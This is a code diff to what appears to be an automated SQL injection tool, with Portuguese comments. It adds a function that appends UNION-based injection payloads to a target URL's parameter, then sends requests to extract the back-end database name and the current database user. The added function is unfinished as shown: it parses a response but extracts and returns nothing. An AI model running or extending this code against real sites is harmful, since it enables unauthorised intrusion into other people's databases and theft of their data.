@@ -4,9 +4,10 @@
 faz um fingerprint no servido, retornando o nome do banco de dados e as suas tabelas
 '''
 
+from bs4 import BeautifulSoup
 import requests
 import re
-
+import json
 from sqlalchemy import column
 
 
@@ -16,6 +17,9 @@ from core.config import VULNERABLE_COLLUM_DETECTING
 from core.config import CHECKING_FOR_DBMS_VERSION
 from core.config import GET_TABLES_NAMES
 from core.config import MYSQL_SERVER_VERSIONS
+from core.config import DATABASE_NAME
+from core.config import GET_CURRENT_USER
+
 from core.config import OS
 from core import colors as color
 from core.utils import  urlExplode
@@ -78,6 +82,36 @@ def _serverVersion(target, cullumns_number):
                     break
     return server_fingerprint_info
 
+def _getDatabaseName(target, cullumns_number):
+    url_exploded = urlExplode(target)
+    para = re.compile('(=)\w+')
+    version = re.compile('^(\d+\.)?(\d+\.)?(\*|\d+)$')
+    exploited_target_url = str()
+    collumns_number_list = []
+    columns = str()
+    index_server_fingerprint_info = 1
+    server_version = str()
+    server_system = str()
+    server_fingerprint_info = {}
+    if para.search(target):
+        splited_para = para.search(target).group()
+        for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
+            collumns_number_list.append(collumns_perc)
+        ## transforma a lista em string eliminando os parentes reto
+        columns = str(collumns_number_list)
+        columns = columns.replace("[", "")
+        columns = columns.replace("]", "")
+        
+        for collumns_perc in  range(1, cullumns_number+1):
+            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), DATABASE_NAME))
+            main_request = requests.get(url=exploited_target_url)
+            
+        ## pegando o usuário actual do banco de dados
+        for collumns_perc in  range(1, cullumns_number+1):
+            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), GET_CURRENT_USER))
+            main_request = requests.get(url=exploited_target_url)
+            main_request_parsed = BeautifulSoup(main_request.content, 'html.parser')
+            
 '''
 mssql db fingerprint
 '''
